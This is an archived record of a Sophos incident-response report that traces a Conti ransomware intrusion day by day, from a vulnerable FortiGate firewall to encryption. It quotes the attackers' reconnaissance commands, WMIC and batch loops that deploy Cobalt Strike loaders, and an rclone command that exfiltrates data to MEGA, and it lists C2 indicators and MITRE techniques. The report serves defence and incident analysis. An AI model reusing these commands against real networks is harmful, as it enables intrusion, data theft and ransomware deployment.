{
    "id": "55f7c253-8fc5-48e8-a34c-d743bdb71762",
    "created_at": "2023-01-12T14:59:12.923158Z",
    "updated_at": "2025-03-27T02:09:18.10094Z",
    "deleted_at": null,
    "sha1_hash": "7f42f54c56757d1c25d3300a1d6554431f3760f7",
    "title": "2021-02-16 - A Conti ransomware attack day-by-day",
    "authors": "",
    "file_creation_date": "2022-05-28T02:35:25Z",
    "file_modification_date": "2022-05-28T02:35:25Z",
    "file_size": 1240936,
    "plain_text": "# A Conti ransomware attack day-by-day\n\n**[news.sophos.com/en-us/2021/02/16/conti-ransomware-attack-day-by-day/](https://news.sophos.com/en-us/2021/02/16/conti-ransomware-attack-day-by-day/)**\n\nMichael Heller February 16, 2021\n\n_Editor’s note: This is one of a series of articles focused on the Conti ransomware family,_\n_which include technical details of the Conti ransomware, Conti ransomware: Evasive by_\n_nature, and a guide IT administrators can use to deal with the impact of an attack involving_\n_[Conti ransomware, What to expect when you’ve been hit with Conti ransomware.](https://news.sophos.com/what-to-expect-when-youve-been-hit-with-conti-ransomware)_\n\nConti ransomware is a global threat affecting victims mainly in North America and Western\nEurope. Sophos Rapid Response has encountered multiple confirmed Conti ransomware\nattacks in the past six months. Sophos operators also strongly believe they encountered\nwhat would have been another incident of Conti had they not stopped the attack before\nransomware was deployed.\n\n\n-----\n\nSince its first appearance, Conti was assumed to be the successor to Ryuk with one crucial\ndifference in that the group behind Conti threatens to leak exfiltrated data to strong-arm\nvictims into paying the ransom. This use of exfiltrated data means organizations from almost\nany industry could be targeted, although the Conti group has hit organizations in retail,\nmanufacturing, construction, and the public sector more often.\n\nOne confirmed case involved an attack on an organization who was able to remove the\nattacker from one server only to find the attacker had gained access to two servers at the\nsame time. Despite the company’s efforts, Sophos Rapid Response needed to be called in to\ndeal with a Conti ransomware attack against nearly 300 endpoints.\n\n\n-----\n\nIt took just over 2.5 hours for the Rapid Response team to determine what accounts and\ndevices were affected, what tools were used in the attack, block the attack from continuing,\nand walk the customer through the process of the Rapid Response engagement.\n\nIn less than 24 hours after Rapid Response was engaged, most of the customer’s critical\ninfrastructure was able to restart normal operation, and within 48 hours, the team confirmed\nthe initial access point of the attack.\n\nA thorough incident response plan is key to dealing with a similar Conti ransomware attack.\nCheck out the Sophos IT admin’s guide to What to expect when you’ve been hit with Conti\n_ransomware._\n\nLet’s dig into the Conti attack, day-by-day, and in some cases minute-by-minute.\n\n## Day 1 – Initial access and scans\n\nThe initial access point for the attack was eventually determined to be a FortiGate firewall\nrunning vulnerable firmware, version 5.6.3 build 1547(GA). Once inside, the attacker gained\naccess to two different servers simultaneously, down to the exact second.\n\nIt took the attacker exactly 16 minutes to exploit the vulnerable firewall and gain domain\nadmin access to the two servers.\n\nOver the next six hours, the attacker deployed a Cobalt Strike beacon on one of the servers\nand began running commands to gather a list of domain admin accounts:\n\ncmd.exe /C nltest /dclist:[target company name]\n\ncmd.exe /C net group “domain Admins” /domain\n\ncmd.exe /C nltest /DOMAIN_TRUSTS\n\ncmd.exe /C adft.bat\n\ncmd.exe /C type shares.txt\n\nAnd commands to map out the basic network topography:\n\nping <computer name>.<domain>.local -n 1\n\ncmd.exe /C portscan <IP ranges> icmp 1024\n\nOn the second server, the attacker did nothing at first.\n\nThe victim identified and shut down the attack in progress on one server, unfortunately they\ndid not detect the access the attacker had to the other server.\n\nAfter the victim shut down the attacker’s access to the first server, it took just 15 minutes for\nthe attacker to pivot to the second server, deploy another Cobalt Strike beacon and resume\nthe attack. The attacker then used the domain admin account compromised to gain access\n\n\n-----\n\nto a third server and ran the following Windows Management Instrumentation (WMI)\ncommand to remotely deploy another Cobalt Strike beacon on the third server :\n\ncmd.exe /C wmic /node:<IP Address> process call create “rundll32.exe\nC:\\Programdata\\sys.dll entryPoint\n\n## Day 2\n\nOn the second day, Sophos did not detect any malicious activity.\n\n\n-----\n\n## Day 3 – Data exfiltration and credential gathering\n\nOver the course of 10 hours on the third day of the attack, the threat actors identified\ndirectories with potentially valuable data and began exfiltration.\n\n\n-----\n\nThe attacker deployed RClone to the third server and created a config file with the login\ncredentials for Mega. The directories exfiltrated included data from the Human Resources\ndepartment, IT department, credit department, accounting, senior staff, and directories\nlabeled as budget.\n\nFirst, the attacker deployed RClone and created a config file containing the email and\npassword for the Mega account where the exfiltrated data would be transferred.\n\nrclone.exe copy “\\\\<Server 3>\\<Folder path>” remote:<victim name> -q –ignore-existing –\nauto-confirm –multi-thread-streams 12 –transfers 12\nC:\\Users\\<compromised domain admin>\\.config\\rclone\\rclone.conf\n\nThe attacker also executed a batch script, cp.bat, to search for user credentials by copying\nall XLSX files with the string “pas” in the filename.\n\n## Day 4 – Conti attacks and beginning of Rapid Response engagement\n\nOn day one of the attack, the threat actors had gathered a map of the victim’s network and\nsaved text file lists of the endpoints and servers. At approximately 1:00 am local time on day\n4, the attacker used batch scripts to loop through those lists of devices in order to copy\nCobalt Strike loaders onto a total of nearly 300 endpoints and servers.\n\nFirst, the attacker deployed a Cobalt Strike beacon to a fourth server as a test:\n\ncmd.exe /C wmic /node: <Server 4 IP Address> process call create “rundll32.exe\nC:\\Programdata\\doc.dll entryPoint”\n\nNext, the attacker executed a batch script, copy_files_srv.bat, to deploy the Cobalt Strike\nloader, doc.dll, on the target servers listed in srv.txt:\n\nfor /f %%i in (srv.txt) do copy “C:\\ProgramData\\doc.dll” \\\\%%i\\c$\\ProgramData\\doc.dll\n\nThen, the attacker executed another batch script, wm_start.bat, to run the Cobalt Strike\nloader on each server listed in srv.txt via rundll32.exe and initiate the beacon:\n\nfor /f %%i in (srv.txt) do wmic /node: %%i process call create “rundll32.exe\nC:\\Programdata\\doc.dll entryPoint”\n\nThese last two commands were then repeated with the batch script, copy_files_work.bat,\nand text file work.txt to deploy and initiate the Cobalt Strike beacons onto nearly 300 target\nendpoints on the victim’s network.\n\nThe Cobalt Strike beacons were kicked into gear 40 minutes after being loaded onto the\ntarget devices and used a technique called reflective DLL injection to launch Conti.\n\n\n-----\n\nA DLL file dropped onto the target devices connected to a C2 address and gets the\nransomware code hosted there. The ransomware code is then executed directly in memory,\nmeaning when it starts encrypting the target machine it has never been written to disk,” Peter\nMackenzie, manager of Rapid Response said. “Despite how clever this is, Sophos Intercept\nX technology would still have no problem stopping it.”\n\nThe C2 addresses used were:\n\nDocns[.]com/us/ky/louisville/312-s-fourth-st.html\ndocns[.]com/OrderEntryService.asmx/AddOrderLine\n23[.]106[.]160[.]174\n\nOver the course of the next 3 hours, Sophos Intercept X successfully detected and blocked\nConti on all of the protected computers, but damage was done to unprotected devices. For\nmore how the DLL reflection injection and Conti ransomware worked, check out the technical\n[details on Conti ransomware by Sophos Uncut.](https://news.sophos.com/en-us/?p=72459&)\n\nThe customer blocked all internet traffic except Sophos, shut down critical infrastructure, and\n[called Sophos Rapid Response.](http://www.sophos.com/rapidresponse)\n\nWithin the first 45 minutes Rapid Response was under contract, before even having the\nkickoff call to walk the customer through the service, the Rapid Response team had:\n\nIdentified the compromised account used in the attack\nIdentified and blocked the malicious DLL used to deploy Conti\nIdentified and blocked the command and control (C2) addresses used by the attacker\nIdentified all endpoints targeted\nDeployed Sophos Managed Threat Response (MTR) to the customer environment\nBegun collecting forensic evidence\n\nIn the 45 minutes following the kickoff call, the Rapid Response team also built a list of all the\ndata exfiltrated by the attacker.\n\n## Day 5 – Back to normal\n\nBy the fifth day after the attacker first gained access to the victim’s network, and less than 24\nhours from when Sophos Rapid Response was called in, the customer was able to restart\nmost of their critical infrastructure to normal operation.\n\nWith the help of Rapid Response, all unprotected machines were recovered either from\nbackups or by re-imaging, then protected with Sophos and multi-factor authentication was\nenabled on the customer’s VPN.\n\n\n-----\n\nThe investigation for Rapid Response was not over yet though. The team identified a\npossible second exfiltration of data, a second compromised account, and suspicious Remote\nDesktop Protocol (RDP) traffic through the vulnerable firewall.\n\n## Day 6 and 7 – Finishing up and handing off\n\nWith the attack stopped and recovery complete, all that was left was a bit of cleanup,\nincluding confirming the initial access method for the attacker and having the customer\nupgrade their firewall to close that vulnerable point.\n\nSophos Rapid Response then handed off the customer to the Sophos Managed Threat\nResponse team to continue 24/7 monitoring.\n\n## Detection and IoCs\n\nComponents of Conti ransomware can detected in Sophos Endpoint Protection under the\nfollowing definitions: HPmal/Conti-B, Mem/Conti-B, or Mem/Meter-D.\n\n[Additional indicators of compromise have been published to the SophosLabs Github.](https://github.com/sophoslabs/IoCs/blob/master/Ransomware-Conti.csv)\n\n## Conti group Tactics, Techniques, and Procedures (TTPs)\n\nIn this case, the Conti group gained initial entry into victim environments by exploiting public\nfacing applications (MITRE ATT&CK [T1190) and using a compromised domain admin](https://attack.mitre.org/techniques/T1190/)\naccount (MITRE ATT&CK [T1212) to facilitate lateral movement.](https://attack.mitre.org/techniques/T1212/)\n\nThe threat actor exploited a vulnerability in FortiGate firewall version 5.6.3 build 1547(GA).\nKnown exploits for this vulnerable firmware include one critically rated vulnerability (CVE[2018-13379) and one high rated vulnerability (CVE-2018-13374).](https://nvd.nist.gov/vuln/detail/CVE-2018-13374)\n\nThe group used multiple batch scripts for system network configuration discovery (MITRE\nATT&CK [T1016), remote system discovery (MITRE ATT&CK](https://attack.mitre.org/techniques/T1016) [T1018), and network service](https://attack.mitre.org/techniques/T1018/)\nscanning (MITRE ATT&CK [T1046). Immediately following initial access, the threat actor](https://attack.mitre.org/techniques/T1046/)\nsearched to identify domain admin accounts (MITRE ATT&CK [T1078.002) and network](https://attack.mitre.org/techniques/T1078/002)\nshares (MITRE ATT&CK [T1021.002).](https://attack.mitre.org/techniques/T1021/002)\n\nDeployment of Cobalt Strike beacons and loaders were performed using Windows\nManagement Instrumentation commands (MITRE ATT&CK [T1047).](https://attack.mitre.org/techniques/T1047)\n\nThe threat actor used RClone in order to exfiltrate data to file storage service MEGA (MITRE\nATT&CK [T1567.002).](https://attack.mitre.org/techniques/T1567/002)\n\nCobalt Strike beacons loaded onto all target systems to perform a DLL reflective injection\nattack (MITRE ATT&CK [T1055.001), where a DLL called to C2 addresses to get the Conti](https://attack.mitre.org/techniques/T1055/001/)\ncode, then load it and execute it directly in memory without writing the ransomware to disk\n\n\n-----\n\nbefore encrypting data for impact (MITRE ATT&CK [T1486).](https://attack.mitre.org/techniques/T1486)\n\n**If you are experiencing an active incident and need immediate response,**\n**contact** **[Sophos Rapid Response. For details of our 24/7](https://www.sophos.com/en-us/products/managed-threat-response/rapid-response.aspx)** **Managed Threat**\n**Response (MTR) service, visit our website or speak with your Sophos representative.**\n\n_Special thanks to Abhijit Gupta, Bill Kearney, David Anderson, Elida Leite, Kevin Simpson,_\n_Matthew Sharf, Paul Jacobs, Peter Mackenzie, Ratul Ghosh, Robert Weiland, Sergio_\n_Bestulic, Syed Shahram Ahmed, Varun Hirve, and Vikas Singh for their efforts_\n_in detecting, investigating, and responding to these threats._\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-16 - A Conti ransomware attack day-by-day.pdf"
    ],
    "report_names": [
        "2021-02-16 - A Conti ransomware attack day-by-day.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535552,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653705325,
    "ts_modification_date": 1653705325,
    "files": {
        "pdf": "https://archive.orkl.eu/7f42f54c56757d1c25d3300a1d6554431f3760f7.pdf",
        "text": "https://archive.orkl.eu/7f42f54c56757d1c25d3300a1d6554431f3760f7.txt",
        "img": "https://archive.orkl.eu/7f42f54c56757d1c25d3300a1d6554431f3760f7.jpg"
    }
}